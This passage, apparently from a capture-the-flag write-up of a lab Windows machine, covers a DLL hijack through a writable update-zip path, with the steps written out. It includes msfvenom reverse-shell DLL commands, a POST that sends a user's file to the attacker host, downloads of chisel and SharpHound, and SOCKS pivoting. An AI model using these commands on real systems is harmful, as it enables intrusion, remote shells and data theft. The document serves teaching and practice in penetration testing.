+<span class="cm">#&gt;</span>
+
+<span class="nv">$TaskName</span> <span class="p">=</span> <span class="s2">&quot;UpdateChecker Agent&quot;</span>
+<span class="nv">$LogPath</span> <span class="p">=</span> <span class="s2">&quot;C:\Share\Logs\TaskMonitor.log&quot;</span>
+<span class="nv">$Timestamp</span> <span class="p">=</span> <span class="nb">Get-Date</span> <span class="n">-Format</span> <span class="s2">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>
+
+<span class="k">try</span> <span class="p">{</span>
+    <span class="nv">$service</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="s2">&quot;Schedule.Service&quot;</span>
+    <span class="nv">$service</span><span class="p">.</span><span class="n">Connect</span><span class="p">()</span>
+    <span class="nv">$task</span> <span class="p">=</span> <span class="nv">$service</span><span class="p">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="s2">&quot;\&quot;</span><span class="p">).</span><span class="n">GetTask</span><span class="p">(</span><span class="nv">$TaskName</span><span class="p">)</span>
+
+    <span class="nv">$State</span> <span class="p">=</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$task</span><span class="p">.</span><span class="n">State</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">1</span> <span class="p">{</span> <span class="s2">&quot;Disabled&quot;</span> <span class="p">}</span>
+        <span class="n">2</span> <span class="p">{</span> <span class="s2">&quot;Queued&quot;</span> <span class="p">}</span>
+        <span class="n">3</span> <span class="p">{</span> <span class="s2">&quot;Ready&quot;</span> <span class="p">}</span>
+        <span class="n">4</span> <span class="p">{</span> <span class="s2">&quot;Running&quot;</span> <span class="p">}</span>
+        <span class="n">5</span> <span class="p">{</span> <span class="s2">&quot;Disabled&quot;</span> <span class="p">}</span>
+        <span class="n">6</span> <span class="p">{</span> <span class="s2">&quot;Unknown&quot;</span> <span class="p">}</span>
+        <span class="k">default</span> <span class="p">{</span> <span class="s2">&quot;Unknown&quot;</span> <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$State</span> <span class="o">-ne</span> <span class="s2">&quot;Ready&quot;</span> <span class="o">-and</span> <span class="nv">$State</span> <span class="o">-ne</span> <span class="s2">&quot;Running&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$Message</span> <span class="p">=</span> <span class="s2">&quot;[$Timestamp] WARN  - Task [$TaskName] is in an unexpected state: $State&quot;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$Message</span> <span class="p">=</span> <span class="s2">&quot;[$Timestamp] INFO  - Task [$TaskName] health check: OK (State: $State)&quot;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">catch</span> <span class="p">{</span>
+    <span class="nv">$Message</span> <span class="p">=</span> <span class="s2">&quot;[$Timestamp] ERROR - Failed to query task [$TaskName]. Exception: </span><span class="p">$(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span><span class="p">)</span><span class="s2">&quot;</span>
+<span class="p">}</span>
+
+<span class="nb">Add-Content</span> <span class="n">-Path</span> <span class="nv">$LogPath</span> <span class="n">-Value</span> <span class="nv">$Message</span>
+</pre></div>
+</div>
+<p>As mentioned in the synopsis we can’t use the usual tools to list the services because
+We don’t have access</p>
+<p>We don’t get that info with Powershell</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Share</span><span class="p">\</span><span class="n">Logs</span><span class="p">&gt;</span> <span class="nb">Get-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;UpdateChecker Agent&quot;</span>
+<span class="n">Cannot</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">CIM</span> <span class="n">server</span><span class="p">.</span> <span class="n">Access</span> <span class="n">denied</span>
+<span class="n">At</span> <span class="n">line</span><span class="p">:</span><span class="n">1</span> <span class="n">char</span><span class="p">:</span><span class="n">1</span>
+<span class="p">+</span> <span class="nb">Get-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;UpdateChecker Agent&quot;</span>
+<span class="p">+</span> <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+    <span class="p">+</span> <span class="n">CategoryInfo</span>          <span class="p">:</span> <span class="n">ResourceUnavailable</span><span class="p">:</span> <span class="p">(</span><span class="n">MSFT_ScheduledTask</span><span class="p">:</span><span class="n">String</span><span class="p">)</span> <span class="p">[</span><span class="nb">Get-ScheduledTask</span><span class="p">],</span> <span class="n">CimJobException</span>
+    <span class="p">+</span> <span class="n">FullyQualifiedErrorId</span> <span class="p">:</span> <span class="n">CimJob_BrokenCimSession</span><span class="p">,</span><span class="nb">Get-ScheduledTask</span>
+</pre></div>
+</div>
+<p>Nor with schtasks in cmd</p>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>*Evil-WinRM* PS C:\Share&gt; schtasks /query /tn &quot;UpdateChecker Agent&quot; /fo list /v
+
+Program &#39;schtasks.exe&#39; failed to run: Access is deniedAt line:1 char:1
++ schtasks /query /tn &quot;UpdateChecker Agent&quot; /fo list /v
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ schtasks /query /tn &quot;UpdateChecker Agent&quot; /fo list /v
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+</pre></div>
+</div>
+<p>But we can use the COM interface instead</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Share</span><span class="p">&gt;</span> <span class="nv">$s</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="s2">&quot;Schedule.Service&quot;</span><span class="p">;</span> <span class="nv">$s</span><span class="p">.</span><span class="n">Connect</span><span class="p">();</span> <span class="nv">$s</span><span class="p">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="s2">&quot;\&quot;</span><span class="p">).</span><span class="n">GetTask</span><span class="p">(</span><span class="s2">&quot;UpdateChecker Agent&quot;</span><span class="p">).</span><span class="n">Definition</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">UserId</span>
+
+<span class="n">jaylee</span><span class="p">.</span><span class="n">clifton</span>
+</pre></div>
+</div>
+<p>Update Monitor runs as clifton</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Share</span><span class="p">&gt;</span> <span class="nv">$s</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="s2">&quot;Schedule.Service&quot;</span><span class="p">;</span> <span class="nv">$s</span><span class="p">.</span><span class="n">Connect</span><span class="p">();</span> <span class="nv">$s</span><span class="p">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="s2">&quot;\&quot;</span><span class="p">).</span><span class="n">GetTask</span><span class="p">(</span><span class="s2">&quot;UpdateChecker Agent&quot;</span><span class="p">).</span><span class="n">Definition</span><span class="p">.</span><span class="n">Actions</span>
+
+
+<span class="n">Id</span>               <span class="p">:</span>
+<span class="nb">Type </span>            <span class="p">:</span> <span class="n">0</span>
+<span class="n">Path</span>             <span class="p">:</span> <span class="s2">&quot;C:\Program Files\UpdateMonitor\UpdateMonitor.exe&quot;</span>
+<span class="n">Arguments</span>        <span class="p">:</span> <span class="n">500</span> <span class="p">/</span><span class="n">scan</span><span class="p">=</span><span class="n">3</span> <span class="p">/</span><span class="n">autofix</span><span class="p">=</span><span class="n">true</span>
+<span class="n">WorkingDirectory</span> <span class="p">:</span>
+<span class="n">HideAppWindow</span>    <span class="p">:</span> <span class="n">False</span>
+</pre></div>
+</div>
+<p>And from here we need to understand what DLLs this thing loads, so we can maybe hijack one</p>
+<p>So I pulled UpdateMonotor.exe on my machine and decompiled it with ILSpy, here’s the main</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">//</span> <span class="n">UpdateMonitor</span><span class="p">.</span><span class="n">Program</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">;</span>
+
+<span class="n">private</span> <span class="n">static</span> <span class="n">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">string</span> <span class="n">path</span> <span class="p">=</span> <span class="s2">&quot;C:\\ProgramData\\UpdateMonitor\\Logs\\monitor.log&quot;</span><span class="p">;</span>
+  <span class="n">string</span> <span class="n">text</span> <span class="p">=</span> <span class="s2">&quot;C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip&quot;</span><span class="p">;</span>
+  <span class="n">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="s2">&quot;C:\\Program Files\\UpdateMonitor\\bin\\&quot;</span><span class="p">;</span>
+  <span class="n">string</span> <span class="n">text3</span> <span class="p">=</span> <span class="s2">&quot;settings_update.dll&quot;</span><span class="p">;</span>
+  <span class="n">string</span> <span class="n">text4</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">text2</span><span class="p">,</span> <span class="n">text3</span><span class="p">);</span>
+  <span class="n">Directory</span><span class="p">.</span><span class="n">CreateDirectory</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="n">GetDirectoryName</span><span class="p">(</span><span class="n">path</span><span class="p">));</span>
+  <span class="n">CleanupLogs</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">90</span><span class="p">);</span>
+  <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Starting Sentinel Update Check...&quot;</span><span class="p">);</span>
+  <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Checking for update on core server...&quot;</span><span class="p">);</span>
+  <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Info: Core did not find file Settings_Update.zip&quot;</span><span class="p">);</span>
+  <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Last status: File not found on core&quot;</span><span class="p">);</span>
+  <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Checking for update on local server...&quot;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="k">try</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">text4</span><span class="p">))</span>
+      <span class="p">{</span>
+        <span class="n">File</span><span class="p">.</span><span class="n">Delete</span><span class="p">(</span><span class="n">text4</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">ZipFile</span><span class="p">.</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">text2</span><span class="p">);</span>
+      <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Successfully unzipped update to &quot;</span> <span class="p">+</span> <span class="n">text2</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span><span class="n">IOException</span> <span class="n">ex</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Update failed: &quot;</span> <span class="p">+</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex2</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Update failed: &quot;</span> <span class="p">+</span> <span class="n">ex2</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;No updates found locally: C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip.&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Loading update applier: &quot;</span> <span class="p">+</span> <span class="n">text4</span><span class="p">);</span>
+  <span class="n">IntPtr</span> <span class="n">intPtr</span> <span class="p">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="n">text4</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">intPtr</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">int</span> <span class="n">lastWin32Error</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetLastWin32Error</span><span class="p">();</span>
+    <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="p">$</span><span class="s2">&quot;Failed to load {text3}. Error code: {lastWin32Error}&quot;</span><span class="p">);</span>
+    <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Update check completed.&quot;</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">try</span>
+  <span class="p">{</span>
+    <span class="n">IntPtr</span> <span class="n">procAddress</span> <span class="p">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">intPtr</span><span class="p">,</span> <span class="s2">&quot;PreUpdateCheck&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">procAddress</span> <span class="p">!=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Calling &#39;PreUpdateCheck&#39; in &quot;</span> <span class="p">+</span> <span class="n">text3</span><span class="p">);</span>
+      <span class="p">((</span><span class="n">PreUpdateCheck</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="n">procAddress</span><span class="p">,</span> <span class="n">typeof</span><span class="p">(</span><span class="n">PreUpdateCheck</span><span class="p">)))();</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;&#39;PreUpdateCheck&#39; not found in &quot;</span> <span class="p">+</span> <span class="n">text3</span> <span class="p">+</span> <span class="s2">&quot;. Continuing...&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">finally</span>
+  <span class="p">{</span>
+    <span class="n">FreeLibrary</span><span class="p">(</span><span class="n">intPtr</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">Log</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;Update check completed.&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>So It looks for a zip file with a DLL in it which then gets moved in the bin folder and
+loaded by the service, and yes we have write access to that path</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">UpdateMonitor</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="s1">&#39;asdf&#39;</span> <span class="p">&gt;</span> <span class="n">file</span><span class="p">.</span><span class="nb">md</span>
+<span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">UpdateMonitor</span><span class="p">&gt;</span> <span class="nb">dir</span>
+
+
+    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">UpdateMonitor</span>
+
+
+<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+<span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+<span class="n">d</span><span class="p">-----</span>        <span class="n">4</span><span class="p">/</span><span class="n">16</span><span class="p">/</span><span class="n">2026</span>   <span class="n">4</span><span class="p">:</span><span class="n">43</span> <span class="n">PM</span>                <span class="n">Logs</span>
+<span class="n">-a</span><span class="p">----</span>        <span class="n">4</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2026</span>  <span class="n">11</span><span class="p">:</span><span class="n">58</span> <span class="n">PM</span>             <span class="n">14</span> <span class="n">file</span><span class="p">.</span><span class="nb">md</span>
+</pre></div>
+</div>
+</section>
+<section id="dll-hijacking">
+<h2>DLL Hijacking<a class="headerlink" href="#dll-hijacking" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.16.84<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4242</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-f<span class="w"> </span>dll<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span>settings_update.dll
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>zip<span class="w"> </span>-r<span class="w"> </span>Settings_Update.zip<span class="w"> </span>settings_update.dll
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">9090</span><span class="p">/</span><span class="n">Settings_Update</span><span class="p">.</span><span class="n">zip</span> <span class="n">-OutFile</span> <span class="n">Settings_Update</span><span class="p">.</span><span class="n">zip</span>
+</pre></div>
+</div>
+<p>Didn’t work, but looking at the logs</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">UpdateMonitor</span><span class="p">\</span><span class="n">Logs</span><span class="p">&gt;</span> <span class="nb">dir</span>
+
+
+    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">UpdateMonitor</span><span class="p">\</span><span class="n">Logs</span>
+
+
+<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+<span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+<span class="n">-a</span><span class="p">----</span>        <span class="n">4</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2026</span>  <span class="n">12</span><span class="p">:</span><span class="n">56</span> <span class="n">AM</span>          <span class="n">98856</span> <span class="n">monitor</span><span class="p">.</span><span class="n">log</span>
+
+
+<span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">UpdateMonitor</span><span class="p">\</span><span class="n">Logs</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">monitor</span><span class="p">.</span><span class="n">log</span>
+</pre></div>
+</div>
+<div class="highlight-txt notranslate"><div class="highlight"><pre><span></span>[2026-04-26 00:56:15] Starting Sentinel Update Check...
+[2026-04-26 00:56:15] Checking for update on core server...
+[2026-04-26 00:56:15] Info: Core did not find file Settings_Update.zip
+[2026-04-26 00:56:15] Last status: File not found on core
+[2026-04-26 00:56:15] Checking for update on local server...
+[2026-04-26 00:56:15] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
+[2026-04-26 00:56:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
+[2026-04-26 00:56:15] Failed to load settings_update.dll. Error code: 193
+[2026-04-26 00:56:15] Update check completed.
+</pre></div>
+</div>
+<p>Even though the system is x64</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">UpdateMonitor</span><span class="p">\</span><span class="n">Logs</span><span class="p">&gt;</span> <span class="no">[Environment]</span><span class="p">::</span><span class="n">Is64BitOperatingSystem</span>
+<span class="n">True</span>
+</pre></div>
+</div>
+<p>The binary is x32</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>objdump<span class="w"> </span>-f<span class="w"> </span>UpdateMonitor.exe
+
+UpdateMonitor.exe:<span class="w">     </span>file<span class="w"> </span>format<span class="w"> </span>pei-i386
+architecture:<span class="w"> </span>i386,<span class="w"> </span>flags<span class="w"> </span>0x0000012f:
+HAS_RELOC,<span class="w"> </span>EXEC_P,<span class="w"> </span>HAS_LINENO,<span class="w"> </span>HAS_DEBUG,<span class="w"> </span>HAS_LOCALS,<span class="w"> </span>D_PAGED
+start<span class="w"> </span>address<span class="w"> </span>0x0040354a
+</pre></div>
+</div>
+<p>We know because <code class="docutils literal notranslate"><span class="pre">Error</span> <span class="pre">code:</span> <span class="pre">193</span></code> is an architecture mismatch</p>
+<p>Let’s do that same thing for x32</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.16.84<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4242</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-f<span class="w"> </span>dll<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span>settings_update.dll
+</pre></div>
+</div>
+<p>Hell yea we get a callback</p>
+</section>
+<section id="further-enumeration-as-jaylee-clifton">
+<h2>Further Enumeration as jaylee clifton<a class="headerlink" href="#further-enumeration-as-jaylee-clifton" title="Permalink to this heading">#</a></h2>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s2">&quot;monitor.log&quot;</span> <span class="n">-Wait</span> <span class="n">-Tail</span> <span class="n">10</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">logging</span><span class="p">\</span><span class="n">jaylee</span><span class="p">.</span><span class="n">clifton</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">echo </span><span class="nv">$PSVersionTable</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Resolve-Path</span> <span class="n">Incident_4922_WSUS_Remediation_ViewExport</span><span class="p">.</span><span class="n">html</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$filePath</span> <span class="p">=</span> <span class="s2">&quot;C:\Users\jaylee.clifton\Documents\Tickets\Incident_4922_WSUS_Remediation_ViewExport.html&quot;</span>
+<span class="nv">$fileBytes</span> <span class="p">=</span> <span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span>
+
+<span class="nb">Invoke-WebRequest</span> <span class="p">`</span>
+  <span class="n">-Uri</span> <span class="s2">&quot;http://10.10.16.84:4242&quot;</span>
+  <span class="n">-Method</span> <span class="n">POST</span> <span class="p">`</span>
+  <span class="n">-ContentType</span> <span class="s2">&quot;application/octet-stream&quot;</span>
+  <span class="n">-Body</span> <span class="nv">$fileBytes</span> <span class="p">`</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">rlwrap</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="n">4242</span>
+</pre></div>
+</div>
+<p>Yea all that was completely unnecessary, but fun anyway.</p>
+<div class="highlight-txt notranslate"><div class="highlight"><pre><span></span>Support Incident View: #4922
+Status: CLOSED - WORKAROUND APPLIED Priority: Urgent (Compliance)
+
+2026-04-06 09:45 Internal Note:
+Machine is still choking on the standard catalog. BITS service is garbage and I&#39;m not
+wasting another morning troubleshooting the local database. Since the &quot;official&quot; server
+migration is apparently taking forever, I&#39;ve pointed this box to the staging endpoint
+at wsus.logging.htb.
+
+2026-04-06 13:20 Internal Note:
+DNS is still not updatedstandard for this departmentso don&#39;t bother pinging it from
+outside the test subnet. I&#39;ve set up a scheduled &quot;ForceSync&quot; task to deal with the
+inevitable lockups.
+
+2026-04-06 16:10 Final Resolution:
+Task is running on a 120s loop. It nukes SoftwareDistribution and restarts the agent
+every cycle. Its a hack, but it works and it keeps the compliance auditors off my back.
+Do not touch the trigger settings. If the services don&#39;t come back up, that&#39;s your problem.
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">9090</span><span class="p">/</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">chisel</span><span class="p">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">./</span><span class="n">chisel</span> <span class="n">server</span> <span class="n">-p</span> <span class="n">4040</span> <span class="p">-</span><span class="n">-socks5</span> <span class="p">-</span><span class="n">-reverse</span>
+<span class="p">./</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">client</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">4040</span> <span class="n">R</span><span class="p">:</span><span class="n">1080</span><span class="p">:</span><span class="n">socks</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">-q</span> <span class="p">\</span>
+  <span class="n">nmap</span> <span class="p">\</span>
+    <span class="n">-sC</span> <span class="n">-sV</span> <span class="p">\</span>
+    <span class="n">-Pn</span> <span class="n">10</span><span class="p">.</span><span class="n">129</span><span class="p">.</span><span class="n">39</span><span class="p">.</span><span class="n">254</span> <span class="p">\</span>
+    <span class="n">-oN</span> <span class="n">scans</span><span class="p">/</span><span class="n">internal</span><span class="p">.</span><span class="n">nmap</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">9090</span><span class="p">/</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-OutFile</span> <span class="n">SharpHound</span><span class="p">.</span><span class="n">ps1</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span>
+</pre></div>
+</div>
+</section>
+<section id="spoofing-wsus-windows-server-update-services">
+<h2>Spoofing WSUS (Windows Server Update Services)<a class="headerlink" href="#spoofing-wsus-windows-server-update-services" title="Permalink to this heading">#</a></h2>
